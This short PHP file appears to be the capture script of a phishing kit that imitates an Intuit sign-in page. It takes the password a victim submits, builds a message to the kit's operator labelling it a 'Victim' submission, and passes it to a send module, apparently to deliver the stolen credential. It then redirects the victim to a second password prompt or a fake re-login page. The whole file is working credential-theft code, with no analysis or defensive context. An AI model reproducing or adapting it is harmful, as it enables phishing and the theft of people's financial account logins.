<?php
require_once('./Module/Setmodule.php');
$message .= "|Wassup, $yourname|| #Victim Submited PASSWORD to your INTUIT page \n"."\n";

$message .= "|Password: ".$_POST['password']."\n\n"; 

require_once('Module/SendModule.php');


	
	  if($settings['ShowSecondPassword'] == "1"){
	header("Location: ../pass2.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
    
  else{
	header("Location: ../Relogin.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  
  
?>
